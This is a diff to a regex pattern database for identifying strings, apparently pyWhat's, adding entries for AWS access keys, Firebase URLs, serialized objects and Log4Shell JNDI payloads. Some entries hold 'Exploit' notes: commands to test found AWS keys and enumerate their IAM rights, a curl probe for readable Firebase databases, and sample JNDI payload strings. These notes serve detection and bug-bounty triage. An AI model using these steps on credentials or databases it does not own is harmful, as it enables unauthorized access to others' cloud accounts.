@@ -113,7 +113,7 @@
    },
    {
       "Name": "Access-Control-Allow-Header",
-      "Regex": "(?i)^(Access-Control-Allow: [a-z0-9\\-*])$",
+      "Regex": "(?i)^(Access-Control-Allow(?:-[a-z]+)?: ?\\S[^\\n]*)$",
       "plural_name": false,
       "Description": "Used for [#CAE4F1][link=https://en.wikipedia.org/wiki/Cross-origin_resource_sharing]Cross-Origin Resource Sharing (CORS)[/link][/#CAE4F1]",
       "Rarity": 1,
@@ -124,9 +124,17 @@
       ],
       "Examples": {
          "Valid": [
-            "Access-Control-Allow: *"
+            "Access-Control-Allow: *",
+            "Access-Control-Allow-Origin: *",
+            "Access-Control-Allow-Origin: https://example.com",
+            "access-control-allow-credentials: true",
+            "Access-Control-Allow-Methods: GET, POST, OPTIONS"
          ],
-         "Invalid": []
+         "Invalid": [
+            "Access-Control-Request-Method: GET",
+            "Access-Control-Allow-Origin:",
+            "Access-Control-Allow-Origin: "
+         ]
       }
    },
    {
@@ -284,7 +292,7 @@
    },
    {
       "Name": "Amazon Web Services Simple Storage (AWS S3) URL",
-      "Regex": "(?i)^([https:\\/\\/]*s3\\.amazonaws.com[\\/]+.*|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com\\/.*)$",
+      "Regex": "(?i)^((?:https?:\\/\\/)?(?:[a-z0-9_-]{1,63}\\.){0,10}s3(?:[.-](?:website[.-]|dualstack\\.)?[a-z]{2}(?:-gov)?-[a-z]+-[0-9])?\\.amazonaws\\.com(?:\\.cn)?(?:\\/[^\\s]*)?)$",
       "plural_name": false,
       "Description": null,
       "Rarity": 1,
@@ -296,9 +304,22 @@
       ],
       "Examples": {
          "Valid": [
-            "http://s3.amazonaws.com/bucket"
+            "http://s3.amazonaws.com/bucket",
+            "https://bucket.s3.amazonaws.com/key",
+            "https://bucket.s3.us-west-2.amazonaws.com/path/key",
+            "https://bucket.s3-us-west-2.amazonaws.com",
+            "https://s3-eu-west-1.amazonaws.com/bucket/key",
+            "http://bucket.s3-website-us-east-1.amazonaws.com",
+            "http://bucket.s3-website.eu-central-1.amazonaws.com/",
+            "https://bucket.s3.dualstack.ap-south-1.amazonaws.com/key",
+            "https://bucket.s3.cn-north-1.amazonaws.com.cn/key",
+            "my_bucket.s3.amazonaws.com/key"
          ],
-         "Invalid": []
+         "Invalid": [
+            "https://s3.example.com/bucket",
+            "https://bucket.s3-us-west-2.example.com",
+            "https://bucket.s4.amazonaws.com/key"
+         ]
       }
    },
    {
@@ -1303,6 +1324,193 @@
       }
    },
    {
+      "Name": "Amazon Web Services Access Key",
+      "Regex": "^((?<![A-Z0-9])(?:AKIA|ASIA|ABIA|ACCA|A3T[A-Z0-9])[A-Z0-9]{16}(?![A-Z0-9]))$",
+      "plural_name": false,
+      "Description": null,
+      "Exploit": "Install awscli (https://aws.amazon.com/cli/), set the access key and secret to environment variables, and execute the following command: $ AWS_ACCESS_KEY_ID=ACCESS_KEY_HERE AWS_SECRET_ACCESS_KEY=[SECRET_KEY] aws sts get-caller-identity\n AWS credentials' permissions can be determined using enumerate-IAM (https://github.com/andresriancho/enumerate-iam).\n This gives broader view of the discovered AWS credentials privileges instead of just checking S3 buckets.\n $ git clone https://github.com/andresriancho/enumerate-iam\n  cd  enumerate-iam\n  ./enumerate-iam.py --access-key ACCESS_KEY_HERE --secret-key [SECRET_KEY]\n",
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Credentials",
+         "API Keys",
+         "AWS",
+         "Bug Bounty",
+         "Amazon"
+      ],
+      "Children": {
+         "Items": {
+            "AKIA": "Long-term access key",
+            "ASIA": "Temporary (AWS STS) access key",
+            "ABIA": "AWS STS service bearer token",
+            "ACCA": "Context-specific credential"
+         },
+         "entry": "Type: ",
+         "method": "hashmap"
+      },
+      "Examples": {
+         "Valid": [
+            "AKIA31OMZKYAARWZ3ERH",
+            "AKIAIOSFODNN7EXAMPLE",
+            "ASIAY34FZKBOKMUTVV7A"
+         ],
+         "Invalid": [
+            "ABCDEFGHIJKLMNOPQRST",
+            "AKIAIOSFODNN7EXAMPL",
+            "akiaiosfodnn7example"
+         ]
+      }
+   },
+   {
+      "Name": "Amazon Web Services IAM Unique Identifier",
+      "Regex": "^((?<![A-Z0-9])(?:AGPA|AIDA|AIPA|ANPA|ANVA|APKA|AROA|ASCA)[A-Z0-9]{17}(?![A-Z0-9]))$",
+      "plural_name": false,
+      "Description": null,
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Identifiers",
+         "AWS",
+         "Amazon"
+      ],
+      "Children": {
+         "Items": {
+            "AGPA": "User group",
+            "AIDA": "IAM user",
+            "AIPA": "Amazon EC2 instance profile",
+            "ANPA": "Managed policy",
+            "ANVA": "Version in a managed policy",
+            "APKA": "Public key",
+            "AROA": "Role",
+            "ASCA": "Certificate"
+         },
+         "entry": "Resource type: ",
+         "method": "hashmap"
+      },
+      "Examples": {
+         "Valid": [
+            "AIDAJQABLZS4A3QDU576Q",
+            "AIDACKCEVSQ6C2EXAMPLE",
+            "AROADBQP57FF2AEXAMPLE"
+         ],
+         "Invalid": [
+            "AKIAIOSFODNN7EXAMPLE",
+            "AIDACKCEVSQ6C2EXAMPL",
+            "AIDACKCEVSQ6C2EXAMPLE1"
+         ]
+      }
+   },
+   {
+      "Name": "Firebase Realtime Database URL",
+      "Regex": "(?i)^((?:https?:\\/\\/)?[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.(?:firebaseio\\.com|[a-z0-9-]+\\.firebasedatabase\\.app)\\/?)$",
+      "plural_name": false,
+      "Description": null,
+      "Exploit": "If the database rules allow public reads, the command below returns its content instead of a 'Permission denied' error:\n  $ curl -L 'FIREBASE_URL_HERE/.json'\n",
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Bug Bounty",
+         "URL",
+         "Firebase",
+         "Google"
+      ],
+      "Examples": {
+         "Valid": [
+            "https://pywhat-test.firebaseio.com",
+            "https://pywhat-test-default-rtdb.firebaseio.com/",
+            "pywhat-test.firebaseio.com",
+            "https://pywhat-test-default-rtdb.europe-west1.firebasedatabase.app"
+         ],
+         "Invalid": [
+            "https://firebaseio.com",
+            "https://-pywhat-test.firebaseio.com",
+            "https://pywhat-test.firebaseio.com.example.com"
+         ]
+      }
+   },
+   {
+      "Name": "Base64 Encoded Java Serialized Object",
+      "Regex": "^((?<![A-Za-z0-9+\\/])rO0AB[A-Za-z0-9+\\/]{10,}={0,2})$",
+      "plural_name": false,
+      "Description": "Deserializing untrusted Java objects can lead to remote code execution.",
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Bug Bounty",
+         "Java",
+         "Base64",
+         "Deserialization"
+      ],
+      "Examples": {
+         "Valid": [
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdXNlcnQABnB5d2hhdHg=",
+            "rO0ABXQABWhlbGxv",
+            "rO0ABXQAC2hlbGxvIHdvcmxk"
+         ],
+         "Invalid": [
+            "rO0AB",
+            "aGVsbG8gd29ybGQ=",
+            "xrO0ABXQABWhlbGxv"
+         ]
+      }
+   },
+   {
+      "Name": "PHP Serialized Object",
+      "Regex": "^((?<![A-Za-z0-9_])(?:a:[0-9]+:\\{|O:[0-9]+:\"[a-zA-Z_\\\\][a-zA-Z0-9_\\\\]*\":[0-9]+:\\{)(?:(?:i:-?[0-9]+;|s:[0-9]+:\"[^\"\\n]*\";)(?:i:-?[0-9]+;|b:[01];|d:-?(?:[0-9.]+(?:E[+-]?[0-9]+)?|INF|NAN);|N;|s:[0-9]+:\"[^\"\\n]*\";|[rR]:[0-9]+;|E:[0-9]+:\"[^\"\\n]*\";|(?:a:[0-9]+:\\{|O:[0-9]+:\"[a-zA-Z_\\\\][a-zA-Z0-9_\\\\]*\":[0-9]+:\\{)(?:(?:i:-?[0-9]+;|s:[0-9]+:\"[^\"\\n]*\";)(?:i:-?[0-9]+;|b:[01];|d:-?(?:[0-9.]+(?:E[+-]?[0-9]+)?|INF|NAN);|N;|s:[0-9]+:\"[^\"\\n]*\";|[rR]:[0-9]+;|E:[0-9]+:\"[^\"\\n]*\";|(?:a:[0-9]+:\\{|O:[0-9]+:\"[a-zA-Z_\\\\][a-zA-Z0-9_\\\\]*\":[0-9]+:\\{)(?:(?:i:-?[0-9]+;|s:[0-9]+:\"[^\"\\n]*\";)(?:i:-?[0-9]+;|b:[01];|d:-?(?:[0-9.]+(?:E[+-]?[0-9]+)?|INF|NAN);|N;|s:[0-9]+:\"[^\"\\n]*\";|[rR]:[0-9]+;|E:[0-9]+:\"[^\"\\n]*\";))*\\}))*\\}))*\\})$",
+      "plural_name": false,
+      "Description": "Passing user input to PHP's unserialize() can lead to PHP object injection.",
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Bug Bounty",
+         "PHP",
+         "Deserialization"
+      ],
+      "Examples": {
+         "Valid": [
+            "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"Alice\";}",
+            "a:2:{i:0;s:5:\"hello\";i:1;s:5:\"world\";}",
+            "O:15:\"App\\Models\\User\":0:{}",
+            "a:3:{i:0;b:1;i:1;d:0.5;i:2;N;}",
+            "a:1:{s:4:\"user\";O:8:\"stdClass\":2:{s:2:\"id\";i:42;s:5:\"roles\";a:1:{i:0;s:5:\"admin\";}}}"
+         ],
+         "Invalid": [
+            "O:8:stdClass",
+            "a:2:",
+            "s:5:\"hello\";",
+            "a:1:{i:0;}",
+            "a:2:{i:0;i:1;"
+         ]
+      }
+   },
+   {
+      "Name": "Log4Shell (Log4j JNDI Lookup) Payload",
+      "Regex": "(?i)^(\\$\\{jndi:(?:ldaps?|rmi|dns|iiop|corba|nds|nis|https?):\\/\\/[^\\s{}]+\\})$",
+      "plural_name": false,
+      "Description": "JNDI lookup used to exploit Log4Shell (CVE-2021-44228) in Apache Log4j 2.",
+      "Rarity": 1,
+      "URL": null,
+      "Tags": [
+         "Bug Bounty",
+         "Exploit",
+         "Log4j",
+         "CVE"
+      ],
+      "Examples": {
+         "Valid": [
+            "${jndi:ldap://example.com/a}",
+            "${jndi:rmi://127.0.0.1:1099/Exploit}",
+            "${JNDI:LDAPS://example.com:636/x}",
+            "${jndi:dns://example.com/a}"
+         ],
+         "Invalid": [
+            "${jndi:ldap://}",
+            "${env:HOME}",
+            "jndi:ldap://example.com/a"
+         ]
+      }
+   },
+   {
       "Name": "Google Cloud Platform API Key",
       "Regex": "(?i)^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$",
       "plural_name": false,
@@ -1541,6 +1749,35 @@
             "e12.23123",
             "n12.1211,e1.12331",
             "123.34,78.8"
+         ]
+      }
+   },
+   {
+      "Name": "Internet Protocol (IP) Address Version 4 CIDR Block",
+      "Regex": "^((?<![0-9.])(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\/(?:3[0-2]|[12][0-9]|[0-9])(?![0-9]))$",
+      "plural_name": false,
+      "Description": null,
+      "Rarity": 0.7,
+      "URL": null,
+      "Tags": [
+         "Identifiers",
+         "Networking",
+         "IP",
+         "IPv4",
+         "CIDR"
+      ],
+      "Examples": {
+         "Valid": [
+            "10.0.0.0/8",
+            "192.168.1.0/24",
+            "0.0.0.0/0",
+            "203.0.113.7/32"
+         ],
+         "Invalid": [
+            "10.0.0.0/33",
+            "256.0.0.0/8",
+            "10.0.0/8",
+            "192.168.1.0"
          ]
       }
    },
@@ -1825,6 +2062,29 @@
             "1Z999AA10123456784"
          ],
          "Invalid": []
+      }
+   },
+   {
+      "Name": "Tox ID",
+      "Regex": "^((?<![0-9A-Fa-f])[0-9A-Fa-f]{76}(?![0-9A-Fa-f]))$",
+      "plural_name": false,
+      "Description": "Address of a user of the Tox instant messenger.",
+      "Rarity": 0.5,
+      "URL": null,
+      "Tags": [
+         "Identifiers",
+         "Tox",
+         "Messaging"
+      ],
+      "Examples": {
+         "Valid": [
+            "89E611BB459C43A72FDD1377EF44890060A501FFDF7C7D3FBEAE2C5D367653AFD34DB33F90C9",
+            "89e611bb459c43a72fdd1377ef44890060a501ffdf7c7d3fbeae2c5d367653afd34db33f90c9"
+         ],
+         "Invalid": [
+            "89E611BB459C43A72FDD1377EF44890060A501FFDF7C7D3FBEAE2C5D367653AFD34DB33F90C",
+            "89E611BB459C43A72FDD1377EF44890060A501FFDF7C7D3FBEAE2C5D367653AFD34DB33F90C9A"
+         ]
       }
    },
    {
@@ -2486,28 +2746,6 @@
             "yaJhbGciOiJIUzI1NiJ9.e30.4E_Bsx-pJi3kOW9wVXN8CgbATwP09D9V5gxh9-9zSZ0",
             "eyJhbGciOiJIUzI1NiJ+9.e3/0.4E_Bsx-pJi3kOW9wVXN8CgbATwP09D9V5gxh9-9zSZ0"
          ]
-      }
-   },
-   {
-      "Name": "Amazon Web Services Access Key",
-      "Regex": "^((?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))$",
-      "plural_name": false,
-      "Description": null,
-      "Exploit": "Install awscli (https://aws.amazon.com/cli/), set the access key and secret to environment variables, and execute the following command: $ AWS_ACCESS_KEY_ID=ACCESS_KEY_HERE AWS_SECRET_ACCESS_KEY=[SECRET_KEY] aws sts get-caller-identity\n AWS credentials' permissions can be determined using enumerate-IAM (https://github.com/andresriancho/enumerate-iam).\n This gives broader view of the discovered AWS credentials privileges instead of just checking S3 buckets.\n $ git clone https://github.com/andresriancho/enumerate-iam\n  cd  enumerate-iam\n  ./enumerate-iam.py --access-key ACCESS_KEY_HERE --secret-key [SECRET_KEY]\n",
-      "Rarity": 0.2,
-      "URL": null,
-      "Tags": [
-         "Credentials",
-         "API Keys",
-         "AWS",
-         "Amazon"
-      ],
-      "Examples": {
-         "Valid": [
-            "AKIA31OMZKYAARWZ3ERH",
-            "AKIAIOSFODNN7EXAMPLE"
-         ],
-         "Invalid": []
       }
    },
    {
